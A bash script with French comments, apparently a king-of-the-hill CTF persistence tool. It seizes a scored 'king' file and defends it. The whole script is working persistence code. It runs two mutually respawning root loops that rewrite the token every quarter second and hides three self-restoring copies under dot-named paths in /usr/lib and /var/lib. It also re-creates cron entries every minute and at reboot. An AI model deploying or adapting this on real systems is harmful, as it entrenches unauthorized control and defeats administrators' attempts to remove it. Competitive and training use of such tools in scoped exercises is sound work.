#!/usr/bin/env bash
# =============================================================================
# NCTF26 FINALE — gardien ON-BOX (a poser SEULEMENT sur la box de la colline,
# quand le score = un fichier "king" lu par le scorer).
#
#   bash onbox_guardian.sh install   # installe et demarre (root)
#   bash onbox_guardian.sh status    # etat des deux boucles + king file
#   bash onbox_guardian.sh remove    # desinstalle proprement
#
# Pourquoi deux boucles : un concurrent qui tue "le" processus de persistance
# gagne. Ici A surveille B et B surveille A : tuer l'un fait relancer l'autre.
# Chaque boucle :
#   - reecrit le jeton dans le king file des qu'il change (reparation < 0.3 s) ;
#   - verifie que l'autre boucle vit, et la relance sinon ;
#   - re-pose les entrees cron si elles ont ete supprimees ;
#   - se re-installe elle-meme si son binaire a ete efface.
#
# PARAMETRES (env) :
#   KOTH_TOKEN   jeton/valeur a ecrire dans le king file        (REQUIS)
#   KING_FILE    chemin du king file (ex: /koth/king)          (REQUIS)
#   KING_FILE2   second emplacement eventuel                    (optionnel)
#   HOLD_BIN     binaire de la boucle (def: /usr/lib/.koth-hold)
#   GUARD_BIN    copie du gardien   (def: /usr/lib/.koth-guard)
#   CRON_FILE    fichier cron       (def: /etc/cron.d/koth-hold)
#
# REGLES : box de la colline IN-SCOPE uniquement. Pas de DoS, pas d'attaque des
# autres equipes ni de l'infra organisatrice.
# =============================================================================
set -u

KOTH_TOKEN="${KOTH_TOKEN:-}"
KING_FILE="${KING_FILE:-/koth/king}"
KING_FILE2="${KING_FILE2:-}"
HOLD_BIN="${HOLD_BIN:-/usr/lib/.koth-hold}"
GUARD_BIN="${GUARD_BIN:-/usr/lib/.koth-guard}"
GUARD_BAK="${GUARD_BAK:-${GUARD_BIN}.b}"   # 2e copie : si l'un est efface, l'autre le restaure
GUARD_ALT="${GUARD_ALT:-/var/lib/.koth-guard}"   # 3e copie, autre repertoire
CRON_FILE="${CRON_FILE:-/etc/cron.d/koth-hold}"
STATE_DIR="${STATE_DIR:-/tmp/.koth}"

say() { printf '[guardian] %s\n' "$*"; }

# ------------------------------------------------------------------ boucle A/B
# $1 = A|B : je surveille l'autre lettre
guard_loop() {
  local me="$1" other
  [ "$me" = "A" ] && other="B" || other="A"
  mkdir -p "$STATE_DIR" 2>/dev/null || true

  # verrou : empeche les doublons de la MEME lettre
  exec 9>"$STATE_DIR/lock.$me" 2>/dev/null || exec 9>/dev/null
  flock -n 9 2>/dev/null || exit 0

  while :; do
    # 1) le jeton dans le king file (et le second emplacement s'il existe)
    for f in "$KING_FILE" "$KING_FILE2"; do
      [ -n "$f" ] || continue
      if [ "$(cat "$f" 2>/dev/null)" != "$KOTH_TOKEN" ]; then
        printf '%s\n' "$KOTH_TOKEN" > "$f" 2>/dev/null || true
        printf '%s' "$me" > "$STATE_DIR/repairs" 2>/dev/null || true
      fi
    done

    # 2) l'autre boucle vit-elle ?
    if ! pgrep -f "$GUARD_BIN guard $other" >/dev/null 2>&1; then
      setsid "$GUARD_BIN" guard "$other" >/dev/null 2>&1 &
    fi

    # 3) auto-reparation : plusieurs copies se restaurent mutuellement.
    #    (ne JAMAIS sortir de la boucle ici : une boucle qui meurt est une defaite)
    local src="" f
    for f in "$GUARD_BIN" "$GUARD_BAK" "$GUARD_ALT"; do
      [ -x "$f" ] && { src="$f"; break; }
    done
    if [ -n "$src" ]; then
      for f in "$GUARD_BIN" "$GUARD_BAK" "$GUARD_ALT"; do
        if [ ! -x "$f" ]; then
          mkdir -p "$(dirname "$f")" 2>/dev/null || true
          cp -f "$src" "$f" 2>/dev/null && chmod 755 "$f" 2>/dev/null
        fi
      done
      [ -x "$GUARD_BIN" ] || { cp -f "$src" "$GUARD_BIN" 2>/dev/null && chmod 755 "$GUARD_BIN" 2>/dev/null; }
      pgrep -f "$GUARD_BIN guard $me" >/dev/null 2>&1 || \
        setsid "$GUARD_BIN" guard "$me" >/dev/null 2>&1 &
    fi

    # 4) les entrees cron ont-elles ete supprimees ?
    if [ -d /etc/cron.d ] && [ ! -f "$CRON_FILE" ]; then
      printf '%s\n' "* * * * * root $GUARD_BIN guard A" \
                    "@reboot root $GUARD_BIN guard A" \
                    "* * * * * root $GUARD_BIN guard B" \
                    "@reboot root $GUARD_BIN guard B" > "$CRON_FILE" 2>/dev/null
      chmod 644 "$CRON_FILE" 2>/dev/null || true
    fi

    sleep 0.25
  done
}

# ------------------------------------------------------------------- commandes
cmd_install() {
  [ -n "$KOTH_TOKEN" ] || { say "ERREUR : KOTH_TOKEN requis"; exit 2; }
  [ -n "$KING_FILE" ]  || { say "ERREUR : KING_FILE requis"; exit 2; }

  say "installation : king=$KING_FILE${KING_FILE2:+ + $KING_FILE2} gardien=$GUARD_BIN"
  mkdir -p "$STATE_DIR" 2>/dev/null || true

  # le gardien s'installe lui-meme sous un nom discret
  cp -f "$0" "$GUARD_BIN" && chmod 755 "$GUARD_BIN" || { say "ECHEC copie gardien"; exit 1; }
  cp -f "$0" "$GUARD_BAK" && chmod 755 "$GUARD_BAK" || true   # copie de secours
  mkdir -p "$(dirname "$GUARD_ALT")" 2>/dev/null || true
  cp -f "$0" "$GUARD_ALT" 2>/dev/null && chmod 755 "$GUARD_ALT" 2>/dev/null || true

  # entrees cron (@reboot + chaque minute) : deux boucles independantes
  if [ -d /etc/cron.d ] && [ "$(id -u)" = "0" ]; then
    printf '%s\n' "* * * * * root $GUARD_BIN guard A" \
                  "@reboot root $GUARD_BIN guard A" \
                  "* * * * * root $GUARD_BIN guard B" \
                  "@reboot root $GUARD_BIN guard B" > "$CRON_FILE"
    chmod 644 "$CRON_FILE"
    say "cron pose : $CRON_FILE"
  else
    say "note : pas root (ou pas de cron.d) -> persistance limitee a la session"
  fi

  # jeton immediat
  printf '%s\n' "$KOTH_TOKEN" > "$KING_FILE" 2>/dev/null || true
  [ -n "$KING_FILE2" ] && printf '%s\n' "$KOTH_TOKEN" > "$KING_FILE2" 2>/dev/null || true

  # les deux boucles, detachees
  setsid "$GUARD_BIN" guard A >/dev/null 2>&1 &
  setsid "$GUARD_BIN" guard B >/dev/null 2>&1 &
  sleep 1

  local a b
  a=$(pgrep -f "$GUARD_BIN guard A" | head -1)
  b=$(pgrep -f "$GUARD_BIN guard B" | head -1)
  say "boucle A : ${a:-INACTIVE} | boucle B : ${b:-INACTIVE}"
  say "king file = $(cat "$KING_FILE" 2>/dev/null)"
  [ -n "$a" ] && [ -n "$b" ] && say "OK — persistance double active (separee, auto-reparatrice)"
}

cmd_status() {
  local a b
  a=$(pgrep -f "$GUARD_BIN guard A" | head -1)
  b=$(pgrep -f "$GUARD_BIN guard B" | head -1)
  say "boucle A : ${a:-arretee}"
  say "boucle B : ${b:-arretee}"
  say "king file ($KING_FILE) = $(cat "$KING_FILE" 2>/dev/null)"
  [ -n "$KING_FILE2" ] && say "king file 2 ($KING_FILE2) = $(cat "$KING_FILE2" 2>/dev/null)"
  [ -f "$CRON_FILE" ] && say "cron : present" || say "cron : absent"
  say "reparations recentes : $(cat "$STATE_DIR/repairs" 2>/dev/null || echo 0)"
}

cmd_remove() {
  say "desinstallation"
  rm -f "$CRON_FILE" 2>/dev/null || true
  ps -eo pid,args | awk -v h="$GUARD_BIN" '$0 ~ h && $0 ~ /guard/ {print $1}' | xargs -r kill 2>/dev/null
  rm -f "$GUARD_BIN" "$GUARD_BAK" "$GUARD_ALT" 2>/dev/null || true
  rm -rf "$STATE_DIR" 2>/dev/null || true
  say "fait (le king file n'est pas efface : c'est la colline, pas notre persistance)"
}

case "${1:-}" in
  install) cmd_install ;;
  guard)   guard_loop "${2:-A}" ;;
  status)  cmd_status ;;
  remove)  cmd_remove ;;
  *) sed -n '2,22p' "$0"; exit 1 ;;
esac
